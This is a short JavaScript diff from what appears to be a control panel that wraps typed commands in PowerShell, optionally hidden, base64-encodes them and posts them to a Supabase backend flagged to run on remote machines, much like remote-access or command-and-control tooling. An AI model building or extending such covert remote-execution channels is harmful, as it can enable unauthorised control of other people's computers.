@@ -3104,10 +3104,10 @@
                 const matchedKeyword = specialWords.find(word => trimmedInput.startsWith(word));
 
                 if (matchedKeyword) {
-                    return utf8ToBase64(trimmedInput);
+                    return { cmd: trimmedInput, literal: true };
                 }
 
-                return wrapPowershell(rawInput, hidden);
+                return { cmd: wrapPowershell(rawInput, hidden), literal: false };
             }
             // ── Send / fetch ──
             async function doSendPopup() {
@@ -3130,7 +3130,10 @@
 
                 const body = {};
                 // Encode the outbound command for transport/storage in Supabase.
-                if (rawCmd) { body.cmd = btoa(rawCmd); body.run = true; }
+                if (rawCmd) {
+                    body.cmd = rawCmd.literal ? utf8ToBase64(rawCmd.cmd) : btoa(rawCmd.cmd);
+                    body.run = true;
+                }
                 if (mode === 'cmd') body.visible = runState.selectedVis;
 
                 const headers = { apikey: runState.apiKey, Authorization: `Bearer ${runState.apiKey}`, 'Content-Type': 'application/json' };
